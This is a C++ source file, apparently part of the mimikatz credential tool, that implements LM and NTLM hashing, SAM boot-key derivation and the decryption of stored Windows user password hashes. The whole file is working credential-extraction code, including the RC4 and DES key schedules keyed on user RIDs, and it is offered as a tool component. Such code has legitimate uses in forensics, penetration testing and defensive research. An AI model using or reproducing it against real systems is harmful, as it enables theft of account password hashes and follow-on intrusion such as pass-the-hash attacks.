/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "mod_hash.h"

PSYSTEM_FUNCTION_006 mod_hash::SystemFunction006 = reinterpret_cast<PSYSTEM_FUNCTION_006>(GetProcAddress(GetModuleHandle(L"advapi32"), "SystemFunction006"));
PSYSTEM_FUNCTION_007 mod_hash::SystemFunction007 = reinterpret_cast<PSYSTEM_FUNCTION_007>(GetProcAddress(GetModuleHandle(L"advapi32"), "SystemFunction007"));
PRTL_UPCASE_UNICODE_STRING_TO_OEM_STRING mod_hash::RtlUpcaseUnicodeStringToOemString = reinterpret_cast<PRTL_UPCASE_UNICODE_STRING_TO_OEM_STRING>(GetProcAddress(GetModuleHandle(L"ntdll"), "RtlUpcaseUnicodeStringToOemString"));
PRTL_INIT_UNICODESTRING mod_hash::RtlInitUnicodeString = reinterpret_cast<PRTL_INIT_UNICODESTRING>(GetProcAddress(GetModuleHandle(L"ntdll"), "RtlInitUnicodeString"));
PRTL_FREE_OEM_STRING mod_hash::RtlFreeOemString = reinterpret_cast<PRTL_FREE_OEM_STRING>(GetProcAddress(GetModuleHandle(L"ntdll"), "RtlFreeOemString"));

bool mod_hash::lm(wstring * chaine, wstring * hash)
{
	bool status = false;
	UNICODE_STRING maChaine;
	OEM_STRING maDestination;
	BYTE monTab[16];

	RtlInitUnicodeString(&maChaine, chaine->c_str());
	if(NT_SUCCESS(RtlUpcaseUnicodeStringToOemString(&maDestination, &maChaine, TRUE)))
	{
		if(status = NT_SUCCESS(SystemFunction006(maDestination.Buffer, monTab)))
			hash->assign(mod_text::stringOfHex(monTab, sizeof(monTab)));

		RtlFreeOemString(&maDestination);
	}
	return status;
}

bool mod_hash::ntlm(wstring * chaine, wstring * hash)
{
	bool status = false;
	UNICODE_STRING maChaine;
	BYTE monTab[16];
	
	RtlInitUnicodeString(&maChaine, chaine->c_str());
	if(status = NT_SUCCESS(SystemFunction007(&maChaine, monTab)))
		hash->assign(mod_text::stringOfHex(monTab, sizeof(monTab)));
	return status;
}

void mod_hash::getBootKeyFromKey(BYTE bootkey[0x10], BYTE key[0x10])
{
	BYTE permut[] = {0x0b, 0x06, 0x07, 0x01, 0x08, 0x0a, 0x0e, 0x00, 0x03, 0x05, 0x02, 0x0f, 0x0d, 0x09, 0x0c, 0x04};
	for(unsigned int i = 0; i < 0x10; i++)
		bootkey[i] = key[permut[i]];	
}

bool mod_hash::getHbootKeyFromBootKeyAndF(BYTE hBootKey[0x10], BYTE bootKey[0x10], BYTE * AccountsF)
{
	bool reussite = false;
	unsigned char qwe[] = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%";
	unsigned char num[] = "0123456789012345678901234567890123456789";

	HCRYPTPROV hCryptProv = NULL;
	HCRYPTHASH hHash = NULL;
	if(CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
	{
		BYTE md5hash[0x10] = {0};
		DWORD dwHashDataLen = sizeof(md5hash);
		CryptCreateHash(hCryptProv, CALG_MD5, 0, 0, &hHash);
		CryptHashData(hHash, AccountsF + 0x70, 0x10, 0);
		CryptHashData(hHash, qwe, sizeof(qwe), 0);
		CryptHashData(hHash, bootKey, 0x10, 0);
		CryptHashData(hHash, num, sizeof(num), 0);
		CryptGetHashParam(hHash, HP_HASHVAL, md5hash, &dwHashDataLen, 0);
		CryptDestroyHash(hHash);
		CryptReleaseContext(hCryptProv, 0);
		reussite = mod_crypto::genericDecrypt(AccountsF + 0x80, 0x10, md5hash, 0x10, CALG_RC4, hBootKey, 0x10);
	}
	return reussite;
}

bool mod_hash::decryptHash(wstring * hash, BYTE * hBootKey, USER_V * userV, SAM_ENTRY * encHash, DWORD rid, bool isNtlm)
{
	bool reussite = false;
	unsigned char ntpassword[] = "NTPASSWORD";
	unsigned char lmpassword[] = "LMPASSWORD";

	BYTE obfkey[0x10];
	BYTE mes2CleDES[0x10];

	if(encHash->lenght == 0x10 + 4)
	{
		HCRYPTPROV hCryptProv = NULL;
		HCRYPTHASH hHash = NULL;
		if(CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
		{
			BYTE md5hash[0x10] = {0};
			DWORD dwHashDataLen = 0x10;
			CryptCreateHash(hCryptProv, CALG_MD5, 0, 0, &hHash);
			CryptHashData(hHash, hBootKey, 0x10, 0);
			CryptHashData(hHash, (BYTE *) &rid, sizeof(rid), 0);
			CryptHashData(hHash, isNtlm ? ntpassword : lmpassword, isNtlm ? sizeof(ntpassword) : sizeof(lmpassword), 0);
			CryptGetHashParam(hHash, HP_HASHVAL, md5hash, &dwHashDataLen, 0);
			CryptDestroyHash(hHash);
			
			CryptReleaseContext(hCryptProv, 0);

			if(mod_crypto::genericDecrypt(&(userV->datas) + encHash->offset + 4, 0x10, md5hash, 0x10, CALG_RC4, obfkey, 0x10))
			{
				sid_to_key1(rid, mes2CleDES);
				sid_to_key2(rid, mes2CleDES + 8);
			
				reussite = mod_crypto::genericDecrypt(obfkey + 0, sizeof(obfkey) / 2, mes2CleDES + 0, sizeof(mes2CleDES) / 2, CALG_DES) &&
					mod_crypto::genericDecrypt(obfkey + 8, sizeof(obfkey) / 2, mes2CleDES + 8, sizeof(mes2CleDES) / 2, CALG_DES);
			}
		}
	}
	hash->assign(reussite ? mod_text::stringOfHex(obfkey, sizeof(obfkey)) : L"");

	return reussite;
}

void mod_hash::str_to_key(BYTE *str, BYTE *key)
{
	key[0] = str[0] >> 1;
	key[1] = ((str[0] & 0x01) << 6) | (str[1] >> 2);
	key[2] = ((str[1] & 0x03) << 5) | (str[2] >> 3);
	key[3] = ((str[2] & 0x07) << 4) | (str[3] >> 4);
	key[4] = ((str[3] & 0x0f) << 3) | (str[4] >> 5);
	key[5] = ((str[4] & 0x1f) << 2) | (str[5] >> 6);
	key[6] = ((str[5] & 0x3f) << 1) | (str[6] >> 7);
	key[7] = str[6] & 0x7f;
	for (DWORD i = 0; i < 8; i++)
		key[i] = (key[i] << 1);
}

void mod_hash::sid_to_key1(DWORD sid, BYTE deskey[8])
{
	unsigned char s[7];
	s[0] = s[4] =	(unsigned char)((sid)		& 0xff);
	s[1] = s[5] =	(unsigned char)((sid >> 8)	& 0xff);
	s[2] = s[6] =	(unsigned char)((sid >>16)	& 0xff);
	s[3] =			(unsigned char)((sid >>24)	& 0xff);
	str_to_key(s, deskey);
}

void mod_hash::sid_to_key2(DWORD sid, BYTE deskey[8])
{
	unsigned char s[7];

	s[0] = s[4] =	(unsigned char)((sid >>24)	& 0xff);
	s[1] = s[5] =	(unsigned char)((sid)		& 0xff);
	s[2] = s[6] =	(unsigned char)((sid >> 8)	& 0xff);
	s[3] =			(unsigned char)((sid >>16)	& 0xff);
	str_to_key(s, deskey);
}
